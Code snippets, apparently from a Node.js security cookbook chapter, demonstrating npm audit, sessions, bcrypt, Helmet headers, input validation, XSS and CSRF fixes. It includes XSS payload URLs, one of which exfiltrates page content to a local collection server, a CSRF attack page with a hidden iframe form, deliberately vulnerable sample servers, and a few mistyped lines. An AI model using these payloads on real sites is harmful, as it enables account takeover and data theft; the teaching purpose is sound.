["```js\n$ mkdir audit-deps\n$ cd audit-deps\n$ npm init --yes\n```", "```js\n    $ npm install express@4.16.0\n    added 8 packages, removed 3 packages, changed 14 packages, and audited 52 packages in 674ms\n    3 high severity vulnerabilities\n    To address all issues, run:\n      npm audit fix\n    Run `npm audit` for details.\n    ```", "```js\n    $ npm audit\n    ```", "```js\n    $ npm audit fix\n    npm WARN audit-deps@1.0.0 No description\n    npm WARN audit-deps@1.0.0 No repository field.\n    + express@4.17.1\n    added 8 packages from 10 contributors, removed 4 packages and updated 17 packages in 1.574s\n    fixed 9 of 9 vulnerabilities in 46 scanned packages\n    ```", "```js\n    $ npm audit\n    found 0 vulnerabilities\n    ```", "```js\n    $ mkdir fastify-auth\n    $ cd fastify-auth\n    $ npm init --yes\n    $ mkdir routes views\n    $ touch server.js routes/index.js views/index.ejs\n    ```", "```js\n    $ npm install fastify @fastify/view @fastify/formbody ejs\n    ```", "```js\n    const fastify = require('fastify')({ logger: true });\n    const path = require('path');\n    const view = require('@fastify/view');\n    const fastifyFormbody = require('@fastify/formbody');\n    const indexRoutes = require('./routes/index');\n    fastify.register(fastifyFormbody);\n    fastify.register(view, {\n      engine: {\n        ejs: require('ejs')\n      },\n      root: path.join(__dirname, 'views')\n    });\n    fastify.register(indexRoutes);\n    const start = async () => {\n      try {\n        await fastify.listen({ port: 3000 });\n        fastify.log.info(`Server listening on\n          ${fastify.server.address().port}`);\n      } catch (err) {\n        fastify.log.error(err);\n        process.exit(1);\n      }\n    };\n    start();\n    ```", "```js\n    async function routes(fastify, options) {\n        fastify.get('/', async (request, reply) => {\n          return reply.view('index.ejs');\n        });\n      }\n    module.exports = routes;\n    ```", "```js\n    <html>\n        <head>\n            <title>Authentication with Fastify</title>\n        </head>\n        <body>\n            <h1>Authentication with Fastify</h1>\n            <% if (typeof user !== 'undefined' && user) {\n              %>\n            <p>Hello <%= user.username %>!</p>\n            <p><a href=\"/auth/logout\">Logout</a></p>\n            <% } else { %>\n            <p><a href=\"/auth/login\">Login</a></p>\n            <% } %>\n        </body>\n    </html>\n    ```", "```js\n    $ node server.js\n    ```", "```js\n    $ npm install @fastify/cookie @fastify/session\n    ```", "```js\n    $ touch routes/auth.js views/login.ejs\n    ```", "```js\n    <html>\n      <head>\n        <title>Authentication with Fastify - Login</title>\n      </head>\n      <body>\n        <h1>Authentication with Fastify - Login</h1>\n        <% if (fail) { %>\n        <h2>Login Failed.</h2>\n        <% } %>\n        <form method=\"post\" action=\"login\">\n          Username: <input type=\"text\" name=\"username\" />\n          Password: <input type=\"password\" name=\"password\"\n            />\n          <input type=\"submit\" value=\"Login\" />\n        </form>\n      </body>\n    </html>\n    ```", "```js\n    const users = [{ username: 'beth', password:\n      'badpassword' }];\n    async function routes (fastify, options) {\n      fastify.get('/login', async (request, reply) => {\n        return reply.view('login.ejs', { fail: false });\n      });\n      fastify.post('/login', async (request, reply) => {\n        const { username, password } = request.body;\n        const user = users.find((u) => u.username ===\n          username);\n        if (user && password === user.password) {\n          request.session.user = { username: user.username };\n          await request.session.save();\n          return reply.view('index.ejs', { user:\n            request.session.user });\n        } else { return reply.view('login.ejs', { fail:\n          true }); }\n      });\n      fastify.get('/logout', async (request, reply) => {\n        request.session.destroy((err) => {\n          if (err) { return reply.send(err); }\n          else { return reply.redirect('/'); }\n        });\n      });\n    }\n    module.exports = routes;\n    ```", "```js\n    async function routes (fastify, options) {\n      fastify.get('/', async (request, reply) => {\n        const user = request.session.user;\n        return reply.view('index.ejs', { user: user });\n      });\n    }\n    module.exports = routes;\n    ```", "```js\n    ...\n    const view = require('@fastify/view');\n    const fastifyFormbody = require('@fastify/formbody');\n    const fastifyCookie = require('@fastify/cookie');\n    const fastifySession = require('@fastify/session');\n    ...\n    ```", "```js\n    const indexRoutes = require('./routes/index');\n    const authRoutes = require('./routes/auth');\n    ...\n    ```", "```js\n    fastify.register(fastifyCookie);\n    fastify.register(fastifySession, {\n      secret: 'a secret with minimum length of 32\n        characters',\n      cookie: {\n        httpOnly: true\n      },\n      saveUninitialized: false,\n      resave: false\n    });\n    ```", "```js\n    fastify.register(indexRoutes);\n    fastify.register(authRoutes, { prefix: '/auth' });\n    ```", "```js\n    $ node server.js\n    ```", "```js\n    $ mkdir hashing-with-bcrypt\n    $ cd hashing-with-bcrypt\n    $ npm init --yes\n    $ touch hash.js validate-password.js\n    ```", "```js\n    $ npm install bcrypt\n    ```", "```js\n    const password = process.argv[2];\n    ```", "```js\n    const bcrypt = require('bcrypt');\n    ```", "```js\n    const saltRounds = 10;\n    ```", "```js\n    bcrypt.hash(password, saltRounds, (err, hash) => {\n      if (err) {\n        console.error('Error hashing password:', err);\n        process.exit(1);\n      } else {\n        console.log(hash);\n      }\n    });\n    ```", "```js\n    $ node hash.js 'badpassword'\n    $2b$10$7/156fF/0lyqzB2pxHQJE.czJj5xZjN3N8jofXUxXi.UG5X3KAzDO\n    ```", "```js\n    const password = process.argv[2];\n    const hash = process.argv[3];\n    const bcrypt = require('bcrypt');\n    bcrypt\n      .compare(password, hash)\n      .then((res) => {\n        console.log(res);\n      })\n      .catch((err) => console.error(err.message));\n    ```", "```js\n    $ node validate-password.js 'badpassword' '$2b$10$7/156fF/0lyqzB2pxHQJE.czJj5xZjN3N8jofXUxXi.UG5X3KAzDO'\n    true\n    ```", "```js\n    $ mkdir express-helmet\n    $ cd express-helmet\n    $ npm init --yes\n    $ npm install express\n    ```", "```js\n    $ touch server.js\n    ```", "```js\n    const express = require('express');\n    const app = express();\n    app.get('/', (req, res) => res.send('Hello World!'));\n    app.listen(3000, () => {\n      console.log('Server listening on port 3000');\n    });\n    ```", "```js\n    $ node server.js\n    ```", "```js\n    $ curl -I http://localhost:3000\n    ```", "```js\n    HTTP/1.1 200 OK\n    X-Powered-By: Express\n    Content-Type: text/html; charset=utf-8\n    Content-Length: 12\n    ETag: W/\"c-Lve95gjOVATpfV8EL5X4nxwjKHE\"\n    Date: Mon, 01 Jul 2024 02:19:46 GMT\n    Connection: keep-alive\n    Keep-Alive: timeout=5\n    ```", "```js\n    $ npm install helmet\n    ```", "```js\n    const helmet = require('helmet');\n    ```", "```js\n    app.use(helmet());\n    ```", "```js\n    $ node server.js\n    ```", "```js\n    $ curl -I http://localhost:3000\n    ```", "```js\n    HTTP/1.1 200 OK\n    Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests\n    Cross-Origin-Opener-Policy: same-origin\n    Cross-Origin-Resource-Policy: same-origin\n    Origin-Agent-Cluster: ?1\n    Referrer-Policy: no-referrer\n    Strict-Transport-Security: max-age=15552000; includeSubDomains\n    X-Content-Type-Options: nosniff\n    X-DNS-Prefetch-Control: off\n    X-Download-Options: noopen\n    X-Frame-Options: SAMEORIGIN\n    X-Permitted-Cross-Domain-Policies: none\n    X-XSS-Protection: 0\n    Content-Type: text/html; charset=utf-8\n    Content-Length: 12\n    ETag: W/\"c-Lve95gjOVATpfV8EL5X4nxwjKHE\"\n    Date: Mon, 01 Jul 2024 02:21:22 GMT\n    Connection: keep-alive\n    Keep-Alive: timeout=5\n    ```", "```js\napp.use(\n  helmet({\n    referrerPolicy: { policy: 'no-referrer' },\n  })\n);\n```", "```js\n    $ mkdir http-app\n    $ cd http-app\n    $ touch server.js\n    ```", "```js\n    const http = ('node:http');\n    const server = http.createServer((req, res) => {\n      secureHeaders(res);\n      res.end('Hello World!');\n    });\n    const secureHeaders = (res) => {\n      res.setHeader('Cross-Origin-Opener-Policy', 'same-\n        origin');\n      res.setHeader('Cross-Origin-Resource-Policy', 'same-\n        origin');\n      res.setHeader('Origin-Agent-Cluster', '?1');\n      res.setHeader('Referrer-Policy', 'no-referrer');\n      res.setHeader('Strict-Transport-Security', 'max-\n        age=15552000; includeSubDomains');\n      res.setHeader('X-Content-Type-Options', 'nosniff');\n      res.setHeader('X-DNS-Prefetch-Control', 'off');\n      res.setHeader('X-Download-Options', 'noopen');\n      res.setHeader('X-Frame-Options', 'SAMEORIGIN');\n      res.setHeader('X-Permitted-Cross-Domain-Policies',\n        'none');\n      res.setHeader('X-XSS-Protection', '0');\n    };\n    server.listen(3000, () => {\n      console.log('Server listening on port 3000');\n    });\n    ```", "```js\n    $ node server.js\n    ```", "```js\n    $ curl -I http://localhost:3000\n    HTTP/1.1 200 OK\n    Cross-Origin-Opener-Policy: same-origin\n    Cross-Origin-Resource-Policy: same-origin\n    Origin-Agent-Cluster: ?1\n    Referrer-Policy: no-referrer\n    Strict-Transport-Security: max-age=15552000; includeSubDomains\n    X-Content-Type-Options: nosniff\n    X-DNS-Prefetch-Control: off\n    X-Download-Options: noopen\n    X-Frame-Options: SAMEORIGIN\n    X-Permitted-Cross-Domain-Policies: none\n    X-XSS-Protection: 0\n    Date: Wed, 10 Jul 2024 14:21:31 GMT\n    Connection: keep-alive\n    Keep-Alive: timeout=5\n    ```", "```js\n    $ mkdir express-input\n    $ cd express-input\n    $ npm init --yes\n    ```", "```js\n    $ npm install express\n    ```", "```js\n    $ touch server.js\n    ```", "```js\n    const express = require('express');\n    const app = express();\n    app.get('/', (req, res) => {\n      asyncWork(() => {\n        const upper = (req.query.msg || '').toUpperCase();\n        res.send(upper);\n      });\n    });\n    const asyncWork = (callback) => {\n      setTimeout(callback, 0);\n    };\n    app.listen(3000, () => {\n      console.log('Server listening on port 3000');\n    });\n    ```", "```js\n    $ node server.js\n    Server listening on port 3000\n    ```", "```js\n    $ curl http://localhost:3000/\\?msg\\=hello\n    HELLO%\n    ```", "```js\n    $ curl http://localhost:3000/\\?msg\\=hello\\&msg\\=world\n    curl: (52) Empty reply from server\n    ```", "```js\n    Server listening on port 3000\n    /Users/bgriggs/Node.js-Cookbook/Chapter09/express-input/server.js:6\n        const upper = (req.query.msg || '').toUpperCase();\n                                            ^\n    TypeError: (req.query.msg || \"\").toUpperCase is not a function\n        at Timeout._onTimeout (/Users/bgriggs/Node.js-Cookbook/Chapter09/express-input/server.js:6:41)\n        at listOnTimeout (node:internal/timers:573:17)\n        at process.processTimers (node:internal/timers:514:7)\n    Node.js v22.9.0\n    ```", "```js\n    $ cp server.js fixed-server.js\n    ```", "```js\n        let msg = req.query.msg;\n        if (Array.isArray(msg)) msg = msg.pop();\n    ```", "```js\n        const upper = (msg || '').toUpperCase();\n    ```", "```js\n    $ node fixed-server.js\n    ```", "```js\n    $ curl http://localhost:3000/\\?msg\\=hello\\&msg\\=world\n    WORLD%\n    ```", "```js\n> new Buffer(10)\n<Buffer b7 20 00 00 00 00 00 00 00 2c>\n```", "```js\n$ node\n> new Buffer(10)\n<Buffer 00 00 00 00 00 00 00 00 00 00>\n```", "```js\n> new Buffer(10)\n<Buffer 00 00 00 00 00 00 00 00 00 00>\n> (node:46906) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.\n(Use `node --trace-deprecation ...` to show where the warning was created)\n```", "```js\n> let greeting = { \"msg\" : \"hello\" }\nundefined\n> new Buffer(greeting.msg)\n<Buffer 68 65 6c 6c 6f>\n> (node:47025) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.\n(Use `node --trace-deprecation ...` to show where the warning was created)\n```", "```js\n> greeting = { \"msg\" : 10 }\n{ msg: 10 }\n> new Buffer(greeting.msg)\n<Buffer 00 00 00 00 00 00 00 00 00 00>\n> (node:47073) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.\n(Use `node --trace-deprecation ...` to show where the warning was created)\n```", "```js\n> new Buffer.from(greeting.msg)\nUncaught:\nTypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received type number (10)\n```", "```js\n> new Buffer.alloc(10)\n<Buffer 00 00 00 00 00 00 00 00 00 00>\n```", "```js\n$ new Buffer.allocUnsafe(10)\n<Buffer 00 00 00 00 00 00 00 00 ff ff>\n```", "```js\n    $ mkdir json-pollution\n    $ cd json-pollution\n    $ npm init --yes\n    ```", "```js\n    $ touch server.js\n    ```", "```js\n    const http = require('node:http');\n    const { STATUS_CODES } = http;\n    const server = http.createServer((req, res) => {\n      if (req.method === 'POST' && req.url === '/') {\n        greeting(req, res);\n        return;\n      }\n      res.statusCode = 404;\n      res.end(STATUS_CODES[res.statusCode]);\n    });\n    const greeting = (req, res) => {\n      let data = '';\n      req.on('data', (chunk) => (data += chunk));\n      req.on('end', () => {\n        try {\n          data = JSON.parse(data);\n        } catch (e) {\n          res.end('');\n          return;\n        }\n        if (data.hasOwnProperty('name')) {\n          res.end(`${data.msg} ${data.name}`);\n        } else {\n          res.end(data.msg);\n        }\n      });\n    };\n    server.listen(3000, () => {\n      console.log('Server listening on port 3000');\n    });\n    ```", "```js\n    $ node server.js\n    Server listening on port 3000\n    ```", "```js\n    $ curl -H \"Content-Type: application/json\" -X POST -d '{\"msg\": \"Hello\", \"name\": \"Beth\" }' http://localhost:3000/\n    Hello Beth%\n    ```", "```js\n    $ curl -H \"Content-Type: application/json\" -X POST -d '{\"msg\": \"Hello\", \"name\": \"Beth\", \"hasOwnProperty\": 0 }' http://localhost:3000/\n    curl: (52) Empty reply from server\n    ```", "```js\n    Server listening on port 3000\n    /Users/bgriggs/Node.js-Cookbook/Chapter09/json-pollution/server.js:29\n        if (data.hasOwnProperty('name')) {\n                 ^\n    TypeError: data.hasOwnProperty is not a function\n        at IncomingMessage.<anonymous> (/Users/bgriggs/Node.js-Cookbook/Chapter09/json-pollution/server.js:29:14)\n        at IncomingMessage.emit (node:events:519:28)\n        at endReadableNT (node:internal/streams/readable:1696:12)\n        at process.processTicksAndRejections (node:internal/process/task_queues:82:21)\n    Node.js v22.9.0\n    ```", "```js\n    $ npm install ajv\n    ```", "```js\n    $ cp server.js fixed-server.js\n    ```", "```js\n    const Ajv = require('ajv');\n    const ajv = new Ajv();\n    const schema = {\n      title: 'Greeting',\n      type: 'object',\n      properties: {\n        msg: { type: 'string' },\n        name: { type: 'string' }\n      },\n      additionalProperties: false,\n      required: ['msg']\n    };\n    const validate = ajv.compile(schema);\n    ```", "```js\n    const greeting = (req, res) => {\n      let data = '';\n      req.on('data', (chunk) => (data += chunk));\n      req.on('end', () => {\n        try {\n          data = JSON.parse(data);\n        } catch (e) {\n          res.end('');\n          return;\n        }\n        if (!validate(data, schema)) {\n          res.end('');\n          return;\n        }\n        if (data.hasOwnProperty('name')) {\n          res.end(`${data.msg} ${data.name}`);\n        } else {\n          res.end(data.msg);\n        }\n      });\n    };\n    ```", "```js\n    $ node fixed-server.js\n    ```", "```js\n    $ curl -H \"Content-Type: application/json\" -X POST -d '{\"msg\": \"Hello\", \"name\": \"Beth\", \"hasOwnProperty\": 0 }' http://localhost:3000/\n    ```", "```js\n    $ mkdir express-xss\n    $ cd express-xss\n    $ npm init --yes\n    ```", "```js\n    $ npm install express\n    ```", "```js\n    $ touch server.js\n    ```", "```js\n    const express = require('express');\n    const app = express();\n    app.get('/', (req, res) => {\n      const { previous, lang, token } = req.query;\n      getServiceStatus((status) => {\n        res.send(`\n          <h1>Service Status</h1>\n          <div id=status>\n            ${status}\n          </div>\n          <div>\n          <a href=\"${previous}${token}/${lang}\">Back</a>\n          </div>\n        `);\n      });\n    });\n    const getServiceStatus = (callback) => {\n      const status = 'All systems are running.';\n      callback(status);\n    };\n    app.listen(3000, () => {\n      console.log('Server listening on port 3000');\n    });\n    ```", "```js\n    $ node server.js\n    ```", "```js\n    document.getElementById(\"status\").innerHTML=\"All systems are down!\";\n    ```", "```js\n    http://localhost:3000/?previous=%22%3E%3Cscri&token=pt%3Edocument.getElementById(%22status%22).innerHTML=%22All%20systems%20are%20down!%22;%3C&lang=script%3E%20%3Ca%20href=%22/\n    ```", "```js\n    $ cp server.js fixed-server.js\n    ```", "```js\n    $ npm install he\n    ```", "```js\n    const express = require('he');\n    ```", "```js\n    app.get('/', (req, res) => {\n      const { previous, lang, token } = req.query;\n      getServiceStatus((status) => {\n        const href =\n          he.encode(`${previous}${token}/${lang}`);\n        res.send(`\n            <h1>Service Status</h1>\n            <div id=status>\n              ${status}\n            </div>\n            <div>\n            <a href=\"${href}\">Back</a>\n            </div>\n          `);\n      });\n    });\n    ```", "```js\n    $ node fixed-server.js\n    Server listening on port 3000\n    ```", "```js\n    http://localhost:3000/?previous=%22%3E%3Cscri&token=pt%3Edocument.getElementById(%22status%22).innerHTML=%22All%20systems%20are%20down!%22;%3C&lang=script%3E%20%3Ca%20href=%22/\n    ```", "```js\n\"><script>document.getElementById(\"status\").innerHTML=\"All systems are down!\";</script> <a href=\"\n```", "```js\n    $ touch collection-server.js\n    ```", "```js\n    require('node:http')\n      .createServer((req, res) => {\n        console.log(\n          req.connection.remoteAddress,\n          Buffer.from(req.url.split('/attack/')[1],\n            'base64').toString().trim()\n        );\n      })\n      .listen(3001, () => {\n        console.log('Collection Server listening on port\n          3001');\n      });\n    ```", "```js\n    $ node collection-server.js\n    Collection Server listening on port 3001\n    ```", "```js\n    $ node fixed-server.js\n    Server listening on port 3000\n    ```", "```js\n    http://localhost:3000/?previous=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`,0/&token=TOKEN&lang=en\n    ```", "```js\n    javascript:(new Image().src)=``http://localhost:3001/attack/${btoa(document.getElementById(status).innerHTML)}``,0 /\n    ```", "```js\n    $ node collection-server.js\n    ::1 All systems are running.\n    ```", "```js\n    $ cp fixed-server.js protocol-safe-server.js\n    ```", "```js\n    $ npm install escape-html\n    ```", "```js\n    const escapeHTML = require('escape-html');\n    ```", "```js\n    const href = escapeHTML(`/${previous}${token}/${lang}`);\n    ```", "```js\n    $ node protocol-safe-server.js\n    Server listening on port 3000\n    ```", "```js\n    http://localhost:3000/?previous=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`,0/\n    ```", "```js\n    $ cp server.js constraints-server.js\n    ```", "```js\n    const validateParameters = ({ previous, token, lang },\n      query) => {\n        return (\n          Object.keys(query).length <= 3 &&\n          typeof lang === 'string' &&\n          lang.length === 2 &&\n          typeof token === 'string' &&\n          token.length === 16 &&\n          typeof previous === 'string' &&\n          previous.length <= 16\n        );\n    };\n    ```", "```js\n    app.get('/', (req, res) => {\n      const { previous, lang, token } = req.query;\n      if (!validateParameters({ previous, token, lang },\n        req.query)) {\n          res.sendStatus(422);\n          return;\n        }\n      getServiceStatus((status) => {\n        res.send(`\n          <h1>Service Status</h1>\n          <div id=status>\n            ${status}\n          </div>\n          <div>\n          <a href=\"${previous}${token}/${lang}\">Back</a>\n          </div>\n        `);\n      });\n    });\n    ```", "```js\n    $ node constraints-server.js\n    Server listening on port 3000\n    ```", "```js\n    $ mkdir express-csrf\n    $ cd express-csrf\n    $ npm init --yes\n    $ npm install express express-session body-parser\n    ```", "```js\n    $ touch server.js\n    ```", "```js\n    const express = require('express');\n    const bodyParser = require('body-parser');\n    const session = require('express-session');\n    const app = express();\n    const mockUser = {\n      username: 'beth',\n      password: 'badpassword',\n      email: 'beth@example.com'\n    };\n    app.use(\n      session({\n        secret: 'Node Cookbook',\n        name: 'SESSIONID',\n        resave: false,\n        saveUninitialized: false\n      })\n    );\n    app.use(bodyParser.urlencoded({ extended: false }));\n    ```", "```js\n    app.get('/', (req, res) => {\n      if (req.session.user) return\n        res.redirect('/account');\n      res.send(`\n        <h1>Social Media Account - Login</h1>\n        <form method=\"POST\" action=\"/\">\n          <label> Username <input name=username> </label>\n          <label> Password <input name=password\n            type=password> </label>\n          <input type=submit>\n        </form>\n      `);\n    });\n    app.post('/', (req, res) => {\n      if (\n        req.body.username === mockUser.username &&\n        req.body.password === mockUser.password\n      ) {\n        req.session.user = req.body.username;\n      }\n      if (req.session.user) res.redirect('/account');\n      else res.redirect('/');\n    });\n    app.get('/account', (req, res) => {\n      if (!req.session.user) return res.redirect('/');\n        res.send(`\n          <h1>Social Media Account - Settings</h1>\n          <p> Email: ${mockUser.email} </p>\n          <form method=\"POST\" action=/update>\n            <input name=email value=\"${mockUser.email}\">\n            <input type=submit value=Update >\n          </form>\n        `);\n    });\n    app.post('/update', (req, res) => {\n      if (!req.session.user) return res.sendStatus(403);\n      mockUser.email = req.body.email;\n      res.redirect('/');\n    });\n    ```", "```js\n    app.listen(3000, () => {\n      console.log('Server listening on port 3000');\n    });\n    ```", "```js\n    $ node server.js\n    Server listening on port 3000\n    ```", "```js\n    $ touch csrf-server.js\n    ```", "```js\n    const http = require('node:http');\n    const attackerEmail = 'attacker@example.com';\n    const server = http.createServer((req, res) => {\n      res.writeHead(200, { 'Content-Type': 'text/html' });\n      res.end(`\n    <iframe name=hide style=\"position:absolute;left:-\n      1000px\"></iframe>\n    <form method=\"post\"\n      action=\"http://localhost:3000/update\" target=hide>\n    <input type=hidden name=email\n      value=\"${attackerEmail}\">\n    <input type=submit value=\"Click this to win!\">\n    </form>`);\n    });\n    server.listen(3001, () => {\n      console.log('Server listening on port 3001');\n    });\n    ```", "```js\n    $ node csrf-server.js\n    Server listening on port 3001\n    ```", "```js\n    $ cp server.js fixed-server.js\n    ```", "```js\n    app.use(\n      session({\n        secret: 'Node Cookbook',\n        name: 'SESSIONID',\n        resave: false,\n        saveUninitialized: false,\n        cookie: { sameSite: true }\n      })\n    );\n    ```", "```js\n    $ node fixed-server.js\n    Server listening on port 3000\n    ```", "```js\nSet-Cookie:\nSESSIONID=s%3AglL_...gIvei%2BEs; Path=/; HttpOnly; SameSite=Strict\n```", "```js\n    $ cp fixed-server.js csurf-server.js\n    ```", "```js\n    $ npm install csurf\n    ```", "```js\n    const csurf = require('csurf');\n    const csrf = csurf();\n    ```", "```js\n    app.get('/account', csrf, (req, res) => {\n      if (!req.session.user) return res.redirect('/');\n      res.send(`\n          <h1>Social Media Account - Settings</h1>\n          <p> Email: ${mockUser.email} </p>\n          <form method=\"POST\" action=/update>\n            <input type=hidden name=_csrf\n              value=\"${req.csrfToken()}\">\n            <input name=email value=\"${mockUser.email}\">\n            <input type=submit value=Update >\n          </form>\n        `);\n    });\n    ```", "```js\n    app.post('/update', csrf, (req, res) => {\n      if (!req.session.user) return res.sendStatus(403);\n      mockUser.email = req.body.email;\n      res.redirect('/');\n    });\n    ```", "```js\n    $ node csurf-server.js\n    Server listening on port 3000\n    ```", "```js\n    <html>\n    <head></head>\n    <body>\n    <h1>Social Media Account - Settings</h1>\n          <p> Email: beth@example.com </p>\n          <form method=\"POST\" action=\"/update\">\n            <input type=\"hidden\" name=\"_csrf\"\n              value=\"r3AByUA1-csl3hIjrE3J4fB6nRoBT8GCr9YE\">\n            <input name=\"email\" value=\"beth@example.com\">\n            <input type=\"submit\" value=\"Update\">\n          </form>\n        </body>\n    </html>\n    ```"]